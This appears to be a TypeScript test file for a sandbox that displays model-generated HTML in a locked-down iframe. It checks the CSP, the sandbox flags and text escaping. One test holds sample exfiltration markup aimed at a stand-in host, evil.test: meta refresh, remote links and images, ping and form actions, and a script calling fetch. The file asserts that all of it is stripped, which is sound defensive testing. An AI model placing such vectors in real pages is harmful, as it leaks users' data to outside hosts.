import assert from "node:assert/strict";
import { test } from "node:test";
import { VIEW_CSP, VIEW_SANDBOX, defang, viewDocument } from "../src/sandbox.ts";

test("the iframe sandbox never allows same-origin or scripts", () => {
  assert.ok(!VIEW_SANDBOX.includes("allow-same-origin"));
  assert.ok(!VIEW_SANDBOX.includes("allow-scripts"));
});

test("the policy blocks every network request", () => {
  for (const directive of ["default-src 'none'", "connect-src 'none'", "script-src 'none'", "img-src data:", "form-action 'none'", "frame-src 'none'", "base-uri 'none'"]) {
    assert.ok(VIEW_CSP.includes(directive), directive);
  }
  assert.ok(!/https?:|\*/.test(VIEW_CSP));
});

test("egg's policy comes before anything the model wrote", () => {
  const doc = viewDocument("html", '<html><head><meta http-equiv="Content-Security-Policy" content="default-src *"></head><body>hi</body></html>');
  const ours = doc.indexOf(VIEW_CSP);
  assert.ok(ours > 0 && ours < doc.indexOf("hi"));
  assert.ok(!doc.includes("default-src *"), "a looser policy from the model is taken out");
});

test("what could leave the frame without a script is taken out", () => {
  const out = defang(`<meta http-equiv="refresh" content="0;url=https://evil.test/x">
<link rel="dns-prefetch" href="//evil.test"><link rel=stylesheet href="https://evil.test/s.css">
<base href="https://evil.test/"><img src="https://evil.test/p.png"><img src="data:image/png;base64,AAAA">
<a href="https://evil.test/?leak=1" ping="https://evil.test/ping">a link</a>
<iframe src="https://evil.test"></iframe><object data="https://evil.test/o"></object>
<form action="https://evil.test/f"><button formaction="https://evil.test/g">go</button></form>
<script>fetch("https://evil.test")</script><p>kept text</p>`);
  assert.ok(!/<meta|<link|<base|<iframe|<object|<script/i.test(out), out);
  assert.ok(!/(src|href|ping|action|formaction|data)="https:/i.test(out), out);
  assert.ok(out.includes('src="data:image/png;base64,AAAA"'), "inline images stay");
  assert.ok(out.includes("a link") && out.includes("kept text"));
});

test("text views are escaped", () => {
  const doc = viewDocument("text", "<script>alert(1)</script> & co");
  assert.ok(doc.includes("&lt;script&gt;alert(1)&lt;/script&gt; &amp; co"));
});

test("HTML views get a plain light page; text views follow bb's theme", () => {
  const dark = { background: "rgb(20, 20, 20)", foreground: "rgb(230, 230, 230)", muted: "gray", border: "gray", font: "Inter", mono: "Menlo", scheme: "dark" as const };
  assert.ok(viewDocument("html", "<p>x</p>", dark).includes("background:#ffffff"));
  assert.ok(viewDocument("text", "x", dark).includes("background:rgb(20, 20, 20)"));
});
